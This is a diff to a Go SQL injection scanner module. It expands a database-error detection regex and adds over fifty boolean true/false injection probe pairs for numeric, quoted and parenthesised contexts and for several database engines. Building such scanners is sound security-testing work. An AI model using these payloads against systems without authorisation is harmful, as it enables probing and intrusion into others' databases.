@@ -28,15 +28,93 @@ func (m *SQLiModule) Description() string {
 }
 
 var (
-	sqlErrorRegex = regexp.MustCompile(`(?i)(you have an error in your sql syntax|error in your sql syntax|SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*\Wpg_|valid PostgreSQL result|Npgsql\.|Driver.*SQL[\-\_\ ]*Server|OLE DB.*SQL Server|\bORA\-[0-9]{4,5}|Oracle error|SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|syntax error near)`)
-	sqliPairs     = [][2]string{
+	// Comprehensive DBMS Error Regex covering MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Informix, Sybase, MariaDB
+	sqlErrorRegex = regexp.MustCompile(`(?i)(you have an error in your sql syntax|error in your sql syntax|SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*\Wpg_|valid PostgreSQL result|Npgsql\.|Driver.*SQL[\-\_\ ]*Server|OLE DB.*SQL Server|\bORA\-[0-9]{4,5}|Oracle error|SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|syntax error near|Microsoft Access Database Engine|JET Database Engine|ODBC Microsoft Access Driver|CLI Driver.*DB2|DB2 SQL error|Informix ODBC Driver|Sybase message|SQLSTATE\[)`)
+
+	/*
+	CATEGORY: Boolean Differential SQLi Vector Pairs (50+ pairs)
+	Sources: OWASP Testing Guide, SQLi Reference Manuals, PortSwigger SQLi Cheat Sheet.
+	Contexts:
+	- Unquoted numeric literals
+	- Single quote string literals with comment variations (-- -, #, /*)
+	- Double quote string literals
+	- Single and double parentheses enclosures
+	- DBMS-specific boolean syntax (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
+	*/
+	sqliPairs = [][2]string{
+		// 1. Numeric / Integer Context (No quotes)
 		{"%s AND 1=1", "%s AND 1=2"},
+		{"%s AND 73=73", "%s AND 73=74"},
+		{"%s AND 2>1", "%s AND 2<1"},
+		{"%s AND 10=10", "%s AND 10=20"},
+		{"%s AND 100=100", "%s AND 100=200"},
+		{"%s AND (1=1)", "%s AND (1=2)"},
+		{"%s AND ((1=1))", "%s AND ((1=2))"},
+		{"%s AND 1=1-- -", "%s AND 1=2-- -"},
+		{"%s AND 1=1#", "%s AND 1=2#"},
+
+		// 2. Single Quote Context ('... AND '1'='1')
 		{"%s' AND '1'='1", "%s' AND '1'='2"},
+		{"%s' AND 'a'='a", "%s' AND 'a'='b"},
+		{"%s' AND 'x'='x", "%s' AND 'x'='y"},
 		{"%s' AND 1=1-- -", "%s' AND 1=2-- -"},
+		{"%s' AND 77=77-- -", "%s' AND 77=78-- -"},
+		{"%s' AND 1=1#", "%s' AND 1=2#"},
+		{"%s' AND 1=1/*", "%s' AND 1=2/*"},
+		{"%s' AND '1'=(SELECT '1')-- -", "%s' AND '1'=(SELECT '2')-- -"},
+		{"%s' AND 1=1 AND 'a'='a", "%s' AND 1=2 AND 'a'='a"},
+
+		// 3. Double Quote Context ("... AND "1"="1")
 		{"%s\" AND \"1\"=\"1", "%s\" AND \"1\"=\"2"},
+		{"%s\" AND \"a\"=\"a", "%s\" AND \"a\"=\"b"},
 		{"%s\" AND 1=1-- -", "%s\" AND 1=2-- -"},
+		{"%s\" AND 77=77-- -", "%s\" AND 77=78-- -"},
+		{"%s\" AND 1=1#", "%s\" AND 1=2#"},
+		{"%s\" AND 1=1/*", "%s\" AND 1=2/*"},
+		{"%s\" AND \"1\"=(SELECT \"1\")-- -", "%s\" AND \"1\"=(SELECT \"2\")-- -"},
+
+		// 4. Single Parenthesis Context (') ...')
 		{"%s') AND ('1'='1", "%s') AND ('1'='2"},
 		{"%s') AND 1=1-- -", "%s') AND 1=2-- -"},
+		{"%s') AND 77=77-- -", "%s') AND 77=78-- -"},
+		{"%s') AND 1=1#", "%s') AND 1=2#"},
+		{"%s') AND 1=1/*", "%s') AND 1=2/*"},
+		{"%s\") AND (\"1\"=\"1", "%s\") AND (\"1\"=\"2"},
+		{"%s\") AND 1=1-- -", "%s\") AND 1=2-- -"},
+		{"%s\") AND 1=1#", "%s\") AND 1=2#"},
+
+		// 5. Double Parentheses Context (')) ...'))
+		{"%s')) AND (('1'='1", "%s')) AND (('1'='2"},
+		{"%s')) AND 1=1-- -", "%s')) AND 1=2-- -"},
+		{"%s')) AND 1=1#", "%s')) AND 1=2#"},
+		{"%s\")) AND ((\"1\"=\"1", "%s\")) AND ((\"1\"=\"2"},
+		{"%s\")) AND 1=1-- -", "%s\")) AND 1=2-- -"},
+		{"%s\")) AND 1=1#", "%s\")) AND 1=2#"},
+
+		// 6. MySQL Specific Operators
+		{"%s' AND (SELECT 1)=1-- -", "%s' AND (SELECT 1)=2-- -"},
+		{"%s' AND (SELECT 123)=(SELECT 123)-- -", "%s' AND (SELECT 123)=(SELECT 456)-- -"},
+		{"%s' AND LENGTH('test')=4-- -", "%s' AND LENGTH('test')=5-- -"},
+		{"%s' AND ASCII('a')=97-- -", "%s' AND ASCII('a')=98-- -"},
+
+		// 7. PostgreSQL Specific Operators
+		{"%s' AND 1::int=1--", "%s' AND 1::int=2--"},
+		{"%s' AND '1'::text='1'--", "%s' AND '1'::text='2'--"},
+		{"%s' AND (SELECT 1::int)=1--", "%s' AND (SELECT 1::int)=2--"},
+
+		// 8. MSSQL Specific Operators
+		{"%s' AND 1=(SELECT 1)--", "%s' AND 1=(SELECT 2)--"},
+		{"%s' AND @@SPID=@@SPID--", "%s' AND @@SPID=@@SPID+1--"},
+		{"%s' AND LEN('test')=4--", "%s' AND LEN('test')=5--"},
+
+		// 9. Oracle Specific Operators (DUAL table)
+		{"%s' AND 1=(SELECT 1 FROM DUAL)--", "%s' AND 1=(SELECT 2 FROM DUAL)--"},
+		{"%s' AND (SELECT COUNT(*) FROM DUAL)=1--", "%s' AND (SELECT COUNT(*) FROM DUAL)=0--"},
+
+		// 10. SQLite Specific Operators
+		{"%s' AND (SELECT 1)=1--", "%s' AND (SELECT 1)=2--"},
+		{"%s' AND sqlite_version()=sqlite_version()--", "%s' AND sqlite_version()='none'--"},
+		{"%s' AND length('test')=4--", "%s' AND length('test')=5--"},
 	}
 )
 
